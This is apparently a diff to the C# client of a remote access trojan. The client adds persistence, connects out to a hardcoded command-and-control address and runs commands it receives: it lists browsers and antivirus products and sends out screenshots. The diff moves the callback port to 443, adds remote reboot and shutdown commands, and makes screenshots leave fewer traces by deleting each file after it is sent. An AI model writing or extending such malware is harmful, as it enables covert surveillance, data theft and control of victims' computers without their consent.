@@ -4,7 +4,7 @@ using System.Text;
 using Client.Native;
 using Client.Commands;
 using Client.Util;
-using Client.Crypto;
+using System.IO;
 
 
 namespace Client
@@ -31,7 +31,7 @@ namespace Client
                 Functions.AddPersistence();
 
                 // Iniciar la conexión con el servidor
-                client = new TcpClient("192.168.1.132", 8888);
+                client = new TcpClient("192.168.1.132", 443);
                 stream = client.GetStream();
 
                 // Bucle principal para recibir comandos y enviar respuestas
@@ -62,6 +62,14 @@ namespace Client
                         {
                             response = Functions.ListInstalledBrowsers();
                         }
+                        else if (command == "reboot")
+                        {
+                            response = HandleCommands.ExecuteCommand("shutdown /r /t 10");
+                        }
+                        else if (command == "shutdown")
+                        {
+                            response = HandleCommands.ExecuteCommand("shutdown /s");
+                        }
                         else if (command == "antivirus")
                         {
                             response = Functions.ListInstalledAntivirus();
@@ -76,8 +84,11 @@ namespace Client
                         }
                         else if (command=="screenshot")
                         {
-                            Screenshot.CaptureScreen("captura.png");
-                            SendFile("captura.png");
+                            string timestamp = DateTime.Now.ToString("yyyyMMdd-HHmmss");
+                            string filename = $"infiltrator-{timestamp}-screenshot.png";
+                            Screenshot.CaptureScreen(filename);
+                            SendFile(filename);
+                            File.Delete(filename);
                             response = "";
                         }
                         else if (command == "disconnect")
